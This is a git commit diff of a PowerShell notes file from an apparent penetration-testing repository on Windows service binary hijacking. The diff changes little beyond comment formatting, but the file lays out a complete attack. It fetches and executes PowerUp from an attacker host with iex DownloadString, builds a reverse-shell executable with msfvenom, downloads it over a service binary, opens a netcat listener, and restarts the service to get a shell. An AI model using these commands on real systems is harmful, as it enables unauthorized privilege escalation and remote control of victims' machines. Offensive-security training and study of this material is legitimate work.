9c403a373897fe69740bfa77083c82b44095e3fc
Sr4nd3rs0n <73143623+Sr4nd3rs0n@users.noreply.github.com>
2024-08-15 13:09:08 +0200

    Update BinaryHijacking_BasicsSteps.ps1

--- PrivilegeEscalation/Windows/CommPrivEscVectors/BinaryHijacking/BinaryHijacking_BasicsSteps.ps1
+++ PrivilegeEscalation/Windows/CommPrivEscVectors/BinaryHijacking/BinaryHijacking_BasicsSteps.ps1
@@ -1,13 +1,12 @@
-#Using PowerUp:
-##From Victim Powershell:
+#### Using PowerUp:####
+#From Victim Powershell:
 iex (New-Object Net.WebClient).DownloadString('http://<IP_ATTACKER>/PowerUp.ps1')
 Invoke-AllChecks  ||  Get-ModifiableServiceFile
 
 #From Kali --> Once we have loceted the vulnerable Service:
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_ATTACKER> LPORT=<PORT> -f exe -o <SERVICE>.exe
 
-#From Victim Powershell:
-##Create a Service's backup just in case
+#From Victim's Powershell: --> Create a Service's backup just in case
 mv <BINARY_PATH>\<SERVICE>.exe .\Backup_<SERVICE>.exe
 cd <BINARY_PATH>
 iwr -uri http://<IP_ATTACKER>/<SERVICE>.exe -Outfile <SERVICE>.exe
@@ -15,5 +14,7 @@ iwr -uri http://<IP_ATTACKER>/<SERVICE>.exe -Outfile <SERVICE>.exe
 #From Kali:
 rlwrap nc -nvlp <PORT>  || penelope <PORT> -i tun0
 
-#From Victim Powershell:
+#From Victim's Powershell:
 Restart-Service <SERVICE>
+Stop-Service <SERVICE>
+Start-Service <SERVICE>
